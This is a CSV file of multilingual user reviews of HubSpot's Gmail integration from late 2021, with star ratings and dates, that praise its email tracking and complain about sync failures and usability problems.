User Review,Star Rating,Date
très bien mais je cherche le SAV HubSpot pour mes questions techniques - très bien mais je cherche le SAV HubSpot pour mes questions techniques,4 of 5,Dec 8 2021
My emails are not being tracked in HubSpot even though I have tracking turned on.,2 of 5,Dec 7 2021
sync works well from all devices mobile and desktop. It's important for me to have all activities on HubSpot,5 of 5,Dec 7 2021
SuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuper,5 of 5,Dec 7 2021
Gmail is fine. It does what I need from an email and a calendar. However getting the features that I value working with HS has been a challenge.,2 of 5,Dec 6 2021
Sim pois usamos o Gmail tanto para entrar em contato com novos clientes quanto para responder as pessoas que já são nossos clientes.,5 of 5,Dec 6 2021
Ca se désactive constamment. Du coup mon objectif n'est pas atteint. J'envoie des mails mais ils ne s'archivent pas,2 of 5,Dec 6 2021
Gmail is challenging when you have a long thread of emails under the same topic. There is no clear view to see what is the most updated and how threads on the email are being answered.,2 of 5,Dec 5 2021
Na minha opinião a ferramenta atende muito bem os fins propostos e o uso da ferramenta nos permite alcançar de maneira objetiva os resultados profissionais esperados.,5 of 5,Dec 5 2021
If you want to track your emails create a sophisticated CRM and leverage your Sales Pipeline I recommend this product.,5 of 5,Dec 3 2021
Easy to use great visibility in the contact and company record inside of HubSpot. A must have!,5 of 5,Dec 2 2021
Excellent for ease of use. 5 Stars across the board. I really like the 2 layer security.,5 of 5,Dec 2 2021
Excelente herramienta de apoyo diario para recibir y enviar información necesario para realizar trabajos,5 of 5,Dec 1 2021
Gmail é meu provedor padrão tem funcionado muito bem. As atualizações são bem rápidas,5 of 5,Dec 1 2021
Gmail is a great tool. I'm so glad to have it as part of my arsenal of resources!,5 of 5,Dec 1 2021
better with out HubSpot extra work to go back and forth cannot access from my phone so not want another app on my phone,1 of 5,Dec 1 2021
Its a great app but for some reason its broken for me. Does not integrate with Gmail well,3 of 5,Dec 1 2021
Me gusta que desde la aplicación se pueda crear y registrar el correo y se pueda ver el historial desde aqí al igual que se puede visualizar la aparturas clics de mis correos y los documentos que le envío,5 of 5,Nov 30 2021
Using HubSpot to track all your sales & customer emails is fantastic. Records get updated and you have a great information about your communications. The one major major issue is that you have to be really careful about tracking emails because you can end up with a pile of contacts in HubSpot that shouldn't be there. And worse you can end up with legal investor and other emails & documentation inside HubSpot for others to see. HubSpot needs to make it easier to filter out contacts that you don't want to track. It is possible to do this it just isn't easy.,2 of 5,Nov 29 2021
funciona perecto facilita mucho mi gestión diaria en el proceso de ventas .,5 of 5,Nov 29 2021
Easy to use and set up - works well. Really please with how straightforward is was to set up with Gmail (which we used already) can now easily track all communication associated with each deal,5 of 5,Nov 29 2021
working very well for us so far. We are only 2 weeks in though so there's still time :P,5 of 5,Nov 29 2021
It's working well and I will continue to use it more often with my prospects.,4 of 5,Nov 26 2021
That is none of your concern.....................................................,3 of 5,Nov 26 2021
ça marche super bien je recommande ça a changé ma vie bien entendu hahahahah,5 of 5,Nov 24 2021
Gmail est un outil facile à prendre en main et facile gérable sur plusieurs supports que ce soit le téléphone ou le PC - il a une grande accessibilité et a en plus un belle capacité de stockage de données ce qui facilite les échanges de data sans perte de qualité.,3 of 5,Nov 24 2021
this is major for seeing how the email is being received and responded to from the sender,3 of 5,Nov 24 2021
It is working well - I need to be better at using it's functionality and features.,4 of 5,Nov 24 2021
Good. However we need a better way to total the number of emails that are made on a daily weekly etc basis.,4 of 5,Nov 23 2021
L'extension Gmail HubSpot permet de suivre et d'enregistrer les échanges prospects et clients facilement. La fonction ne jamais enregistrer permet de conserver la maîtrise sur sa création de nouveaux contacts. De quoi garder son CRM propre.,5 of 5,Nov 23 2021
Extensão funcionando após instalação ajuda no processo de vendas e nosso time comercial.,5 of 5,Nov 22 2021
Was and is fairly easy to learn both tools; and to utilize different aspects of both to coordinate my daily tasks.,4 of 5,Nov 22 2021
Excelente calidad facilidad manejo sencillo alta capacidad de integración,5 of 5,Nov 22 2021
I like that I can access the CRM and assets directly from Gmail (Snippets Templates etc).,5 of 5,Nov 22 2021
Gmail me es muy funcional y práctico pero la vinculación con HubSpot no es tan sencilla de aprender sobre todo cuando no se desea que todos los correos (contactos) tengan esta vinculación,3 of 5,Nov 20 2021
It was not working. But your team put up with my fears of communications and got the job done.,5 of 5,Nov 19 2021
Funciona muy bien y permite un manejo de la informacion muy dianamico por lo tanto excelente aplicacion,5 of 5,Nov 19 2021
The integration failed to capture all emails being sent. Not able to track down why.,2 of 5,Nov 18 2021
Es fácil de manejar y muy intuitivo. Me ayuda a controlar mejor el seguimiento de mis correos y también a redactarlos de mejor forma.,5 of 5,Nov 18 2021
using Gmail I can connect all y others email accounts and and a only one view,5 of 5,Nov 18 2021
Gmail offre à ses utilisateur une facilité d'utilisation avec une multitude de fonctionnalités pratiques et gratuit.,2 of 5,Nov 17 2021
It's great and it is easy to use I am able to easily see whom opened my email and when.,4 of 5,Nov 17 2021
I have multiple email address and I am using Spark to combine it all. It also has calendar extension and now I have to use also chrome and gmail on the side.,1 of 5,Nov 17 2021
Gmail is great but for some reason even when I open my inbox I get alerts showing my recipient opened the mail.,3 of 5,Nov 17 2021
Tudo funciona mt bem porém não consigo fazer de forma fácil com que um e-mail que eu recebi por fora do HubSpot volte a ter sua cadência por aqui. Por exemplo se eu mando uma mensagem pelo Hub e copio dois destinatários porém um deles clicar em "responder só para mim",5 of 5,Nov 16 2021
I enjoy the functionality. I used calendly for years and it never worked well with other programs.,4 of 5,Nov 16 2021
Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good and Good.,4 of 5,Nov 16 2021
When creating a Meeting on HubSpot it not only added it to my Google Calendar but it shared it with my client's including all of my notes (that I thought would be private). To avoid this I just removed Google from HubSpot so that booking meetings on HubSpot does not email my clients. I will just manually add meetings to my Google Calendar.,1 of 5,Nov 16 2021
I have multiple Gmail addresses that fully integrate with my HubSpot account. Making it super easy to associated contacts with the various emails that get sent.,5 of 5,Nov 16 2021
HubSpot's Gmail plugin is an effective way to send and track emails to customers prospects team members and vendors. Highly recommend it.,5 of 5,Nov 16 2021
funciona bien  es fácil de usar e ingresar la es amigable con mi conexiones,5 of 5,Nov 16 2021
It is great tool to communicate with leads. Very easy to use and has lot of other tools which helps the sales people. For example Google search calendar Google meet.,5 of 5,Nov 16 2021
We are on Google Workspace so Gmail is the logical solution. It works great for us. It would be great to access my personal Gmail emails in HubSpot too like in PipeDrive. It would make answering non-shared-inbox emails so much easier in HubSpot.,4 of 5,Nov 16 2021
Working well for me and the business regarding the e-mail services will recommend to others,5 of 5,Nov 16 2021
HubSpot's integration with Gmail just doesn't stack up against many (most?) of the other sales engagement and automation platforms.,2 of 5,Nov 15 2021
joe@me.net wants some insurance. I add him to HubSpot and can track my calls and emails to Joe. I will get other emails from underwriting@insuranceco.com and applicationreceived@insuranceco.com some of which I will want to attach to Joe or (Joes 100k policy Deal) (others of course from those same emails need to be attached to mary@me.net or susy@me.net) this requested feature has had good feedback in the HubSpot community boards but has not been implemented. Other than that you'll be hooked if you dip you feet in and use the product. It will help you track all those things spead between your calendar your email your sms and your call log all those things that are slipping between the cracks and losing you deals.,3 of 5,Nov 15 2021
Excelente parceria entre as empresas. Só temos a criar mais sinergia. Estamos trilhando uma jornada de inovação e tecnologia,4 of 5,Nov 13 2021
Gmail really works excellent on my business transactions. So precise on time and very helpful.,5 of 5,Nov 13 2021
Gmail is a very efficient instrument for our company. The integration with HubSpot helps managing better the relations with our clients and stay on top of everything.,5 of 5,Nov 12 2021
Die Erweiterung setzt sich "oben auf GMail" und zerstört die Nutzererfahrung an vielen Stellen. Insbesondere indem sie den Fokus klaut. Dadurch löst man aus versehen shortcuts aus und löscht mails. Sehr problematisch.,2 of 5,Nov 11 2021
Overall it has been good. Good integration with other software I am using. HubSpot experience was horrible though. It's the worst a CRM can offer.,1 of 5,Nov 11 2021
email tracking helps provide insight and clarity into past customer/prospect interactions. snippets and templates save loads of time. meeting links too! all of these features are intuitive and easy to access within Gmail.,5 of 5,Nov 10 2021
Toda nossa comunicação fica integrada a plataforma deixando o histórico das tratativas em nosso contato e/ou negócio.,5 of 5,Nov 10 2021
Es muy intuitivo y eso me gusta bastante es muy fácil de usar y no he tenido problema alguno en su uso.,4 of 5,Nov 10 2021
MUY BIEN YA QUE DA LA FACILIDAD DE COMUNICACIÓN Y ADJUNTAR FORMATOS SOLICITADOS,4 of 5,Nov 10 2021
Correcto. El tener integrado el aviso de tareas en ambas aplicaciones me hace avanzar en el día a dia.,5 of 5,Nov 10 2021
It is frustrating to me when I get error messages but I can't see what the error is. There is one error message with 5 listed reasons of why you might have received the error.,2 of 5,Nov 9 2021
Funciona muy bien para poder comunicar los correos que se envian en el uso de los recordatorios por ejemplo.,4 of 5,Nov 9 2021
HubSpot plug in shows up on gmail but the emails are not logged/synced in HubSpot.,1 of 5,Nov 9 2021
Overall is working pretty well the only thing that I find slightly troublesome is the fact that it does not remain pinged nor does it maintain the window opened for calendars for instance.,4 of 5,Nov 9 2021
Muy bien tenemos la facilidad de comunicarnos con los clientes y con nuestro equipo de una forma rápida,5 of 5,Nov 9 2021
Gmail es un aliado más que una herramienta la gran mayoría de empresas con las cuales interactuamos lo tienen y eso facilita no solo videollamadas sino también el trabajo colaborativo.,5 of 5,Nov 8 2021
If I had a choice I would dump HubSpot and get Salesforce. HubSpot has yet to be helpful to me without lots of headaches.,1 of 5,Nov 8 2021
It works well. We used some shitty program called Goldmine before (think windows outlook 2005)...,4 of 5,Nov 8 2021
Fehlerfrei manchmal gibt es Aussetzer aber das ist normal kein Server hat 100% Uptime,3 of 5,Nov 8 2021
This is a "must have" for me. All e-mail are linked to the company and the contact.,5 of 5,Nov 7 2021
Muy familiarizado con gmail y con laplataforma google suite empresarial y personal,5 of 5,Nov 6 2021
Agilidad en los procesos y facilidad de uso en los diferentes apps que tiene gmail.,5 of 5,Nov 5 2021
Gmail is mission critical for our company and my personal work life. I use it for many applications in all areas of my life.,5 of 5,Nov 5 2021
Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien,4 of 5,Nov 4 2021
The overall integration works well but I suggest to integrate the tasks too,4 of 5,Nov 3 2021
Comes Easy to use and has a lot of features. Using it to track the conversation and email to lead generation. Must have for everyone!,5 of 5,Nov 3 2021
Todo el tiempo se desvincula de mi gmail. Y debo logiarme nuevamente...................,2 of 5,Nov 3 2021
C'est notre boite pro mais elle n'a pas l'air parametrable pour l'instant.,1 of 5,Nov 3 2021
The integration between Gmail and HubSpot is working extremely well thank you!,5 of 5,Nov 3 2021
It's okay but should have more features and be quicker to use. I'd like to see whether an email was opened without opening it myself.,2 of 5,Nov 3 2021
Funciona genial es una herramienta útil y muy eficaz de comunicación para los usuarios,5 of 5,Nov 2 2021
good no time to write in details................................................,5 of 5,Nov 2 2021
Nice integration overall. I like having my emails at my fingertips in HubSpot.,4 of 5,Nov 2 2021
Es una plataforma mucho más amigable y facil de usar. Facil de configurar y personalizar.,5 of 5,Nov 2 2021
HubSpot is probably the best help desk service available in the market right now and their support is awesome! The navigation is simple and easy to use. Overall a much better experience than Zendesk.,5 of 5,Nov 2 2021
Gmail is use for communication service complaints services management Lots of mail are for advertising purpose after Unsubsribe the mails are frequently comes with another titles.,2 of 5,Nov 1 2021
mi empresa asido muy funcional y mas que a hora contamos con su nueva herramienta de trabajo,5 of 5,Oct 29 2021
Gmail itself is going well -- it's not really a personal choice more that we have subscribed to Google Workspace as a business and that comes with gmail.,5 of 5,Oct 28 2021
Sim o Gmail atende a minha a necessidade por enquanto não tenho um volume de demanda.,5 of 5,Oct 28 2021
